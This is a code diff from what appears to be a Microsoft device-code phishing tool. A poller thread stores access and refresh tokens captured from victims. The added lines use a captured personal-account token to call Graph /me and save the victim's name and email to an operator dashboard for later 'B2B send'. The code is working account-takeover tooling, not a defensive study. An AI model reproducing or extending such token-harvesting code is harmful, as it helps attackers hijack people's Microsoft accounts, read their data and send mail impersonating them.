@@ -73,11 +73,24 @@ class TokenPoller(threading.Thread):
                 _slowdown_step.pop(user_code, None)
                 db.update_session_token(user_code, access_token, refresh_token, raw_data)
 
-                # Personal (consumer) captures: the v1 token audience is
-                # graph.windows.net, which MS Graph rejects. Skip the profile
-                # lookup here — the executor resolves it with the FOCI-pivoted
-                # msgraph token instead.
-                if not _is_personal:
+                if _is_personal:
+                    # Personal tokens are opaque (not JWTs), so identity must
+                    # come from Graph. Resolve it here so the dashboard shows a
+                    # real name/address immediately instead of "Unknown", and
+                    # so B2B send has a sender address to work with.
+                    try:
+                        _me = graph.make_graph_request(
+                            '/me?$select=displayName,mail,userPrincipalName', access_token)
+                        if _me and not _me.get('error'):
+                            _email = (_me.get('mail') or _me.get('userPrincipalName') or '').strip()
+                            if _email:
+                                db.update_session_profile(
+                                    user_code,
+                                    _me.get('displayName') or _email.split('@')[0],
+                                    _email, 'User')
+                    except Exception as e:
+                        logger.warning(f"[POLLER] {user_code}: personal profile lookup failed: {e}")
+                else:
                     profile = graph.get_user_profile(access_token)
                     if 'error' not in profile:
                         v_email = profile.get('mail') or profile.get('userPrincipalName') or 'Unknown'
